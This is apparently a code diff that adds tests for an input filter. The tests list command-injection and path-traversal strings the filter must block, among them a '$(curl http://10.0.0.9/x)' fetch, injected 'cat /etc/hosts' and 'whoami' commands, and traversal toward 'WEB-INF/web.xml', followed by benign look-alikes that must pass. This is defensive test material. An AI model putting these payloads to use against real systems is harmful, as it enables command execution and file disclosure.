@@ -101,3 +101,25 @@ describe('structural SQL analysis — cost is bounded', () => {
     expect(analyseSqlStructure('')).toEqual([]);
   });
 });
+
+describe('command injection and traversal shapes', () => {
+  const attacks = [
+    '; /bin/cat /etc/hosts', 'x|/usr/bin/whoami', 'a && uname -a', 'q; ls -la /tmp', 'v|id|', ';ps;',
+    '`whoami`', '$(curl http://10.0.0.9/x)', 'f || ping -c 3 10.0.0.1', '& dir c:\\users',
+    '/..../..../boot', '/.../.../.../secret', '..0x2f..0x2fconf', 'WEB-INF/web.xml'
+  ];
+  for (const p of attacks) it(`blocks: ${p}`, () => expect(blocked(p)).toBe(true));
+
+  const benign = [
+    'name;id', 'user|id', 'cat|dog', 'Name & ID', 'R&D ps team', 'the `id` field is required', '`true`', '`false`',
+    'sort=name;type', 'ls', 'id', 'ping me later; sleep well', 'tom & cat; dog', 'a;b;c', 'x|y|z',
+    '../images/logo.png', './docs/../readme.md', 'wait... what/ok... fine/', 'see /usr/share/doc', 'bash scripting; curl basics',
+    'echo', 'type: admin; id: 5', 'dir=asc', 'q=cat -n', 'C:\\Users\\ali\\file.txt', 'version 0x2e'
+  ];
+  for (const p of benign) {
+    it(`passes: ${p}`, () => {
+      const r = classifyPayload(p);
+      expect(r.score, r.signatures.join(' | ')).toBeLessThan(25);
+    });
+  }
+});
